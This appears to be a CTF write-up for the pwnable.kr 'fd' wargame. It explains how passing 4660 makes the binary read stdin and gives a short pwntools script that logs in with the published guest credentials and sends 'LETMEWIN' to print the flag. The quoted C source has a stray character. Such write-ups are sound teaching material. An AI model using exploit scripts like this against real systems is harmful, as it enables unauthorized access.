## Description
fd - 1 pt [writeup]

> Mommy! what is a file descriptor in Linux?
>
> \* try to play the wargame your self but if you are ABSOLUTE > beginner, follow this tutorial link:
> https://youtu.be/971eZhMHQQw
>
> ssh fd@pwnable.kr -p2222 (pw:guest)

## Solution
We are given a binary file `fd`, and it's source code `fd.c`. Let's take a look at the source code:
### fd.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;
f
}
```
We can see that the program is reading from a file descriptor, which is passed as the first argument to the program.\
The program then subtracts `0x1234` from the file descriptor and reads 32 bytes from that file descriptor.\
If the string "LETMEWIN\n" is read, the program prints the flag by calling `/bin/cat flag`.

As you might already know, `stdin` is file descriptor `0`, so if we pass `0x1234` as the first argument to the program, it will read from `stdin`.\
Then we can just pass the string "LETMEWIN\n" to the program and it will print the flag.\
Notice that `0x1234` in hex is `4660` in decimal.

That's basically it, here's the exploit code:
```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
# context.binary = './fd'

shell=ssh('fd','pwnable.kr',password='guest',port=2222)
p = shell.process(['fd', '4660'])

p.sendline(b"LETMEWIN")
p.interactive()
```

## Setup
```bash
scp -P2222 fd@pwnable.kr:* ./fd # Download the files from the server
```
